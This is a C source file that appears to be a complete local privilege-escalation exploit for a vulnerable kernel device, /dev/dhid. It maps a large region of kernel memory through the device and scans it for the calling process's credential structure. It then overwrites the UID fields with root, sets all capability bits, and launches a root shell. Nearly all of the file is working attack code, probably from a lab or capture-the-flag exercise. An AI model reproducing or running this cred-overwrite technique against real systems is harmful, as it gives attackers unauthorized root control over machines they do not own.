#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/mman.h>

#define DHID_DEV        "/dev/dhid"
#define ERROR_MSG_LEN   256
#define ROOT_UID        0

/* FUNCTION PROTOTYPES */

static void do_log (char *msg, ...);
static int get_root (unsigned int *ptr, unsigned long size);

/* LOGGING MACROS */

#define FAIL(fd, x, ...)   do {                                             \
    do_log("[-] ERROR: " x, ## __VA_ARGS__);                                \
    if ( fd != -1 )                                                         \
        close(fd);                                                          \
    return -1;                                                              \
} while (0)

#define INFO(x, ...)   do {                                                 \
    do_log("[+] " x, ## __VA_ARGS__);                                       \
} while (0)


int main (void)
{
    int fd;
    void *mmaped, *mmap_start = (void *)0x43434000;
    unsigned long mmap_size = 0xf0000000;

    if ( (fd = open(DHID_DEV, O_RDWR)) < 0 )
        FAIL(-1, "open device");

    INFO("Device opened (fd: %d)", fd);

    if ( (mmaped = mmap(mmap_start, mmap_size, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0)) == MAP_FAILED )
        FAIL(fd, "mmap");

    INFO("mmap OK: %p", mmaped);

    /* Look for our process's cred structure and escalate our privileges */
    if ( get_root((unsigned int *) mmaped, mmap_size) ) {
        INFO("WE ARE ROOT!");
        execl("/bin/sh", "-", (char *) NULL);  /* Spawn a login shell */
        FAIL(fd, "execl failed");
    }

    FAIL(fd, "NO CRED STRUCTURE FOUND");

    /* never reached */
    return 0;
}

/*
 *  Log messages to stderr.
 */
static void do_log (char *msg, ...)
{
    va_list ap;
    char logmsg[ERROR_MSG_LEN + 1];

    va_start(ap, msg);
    vsnprintf(logmsg, ERROR_MSG_LEN, msg, ap);
    va_end(ap);

    fprintf(stderr, "%s\n", logmsg);
}

/*
 * Perform basic heuristics to find our cred structure in memory. If a potential
 * cred structure is found, we will attempt to modify it and get root privileges.
 */
static int get_root (unsigned int *ptr, unsigned long size)
{
    unsigned int uid = getuid();        /* our original UID */
    unsigned int *cred = ptr;           /* potential cred structure */

    INFO("Looking for our cred structure...");
    for ( unsigned int *aux = ptr; aux < (ptr + size - 0x40); cred = ++aux ) {
        /* Look for 8 consecutive integers that match our UID */
        for ( int i = 0; i < 8; i++ ) {
            if ( *(aux + i) != uid ) {
                cred = NULL;
                break;
            }
        }

        if ( cred ) {
            INFO("Potential cred structure found! addr: %p", cred);
            /* Attempt to eleavate our privileges */
            for ( int i = 0; i < 8; i++ )
                *(aux + i) = ROOT_UID;

            /* Did it work? */
            if ( !getuid() ) {
                /* yes! enable all capabilities */
                for ( int i = 9; i < 14; i++ )
                    *(unsigned long long*)(aux + i) = (unsigned long long) -1;

                return 1;
            } else {
                /* nop, restore the data structure and look for the next one */
                for ( int i = 0; i < 8; i ++ )
                    *(aux + i) = uid;
            }
        }
    }

    /* we didn't manage to elevate our privileges :( */
    return 0;
}
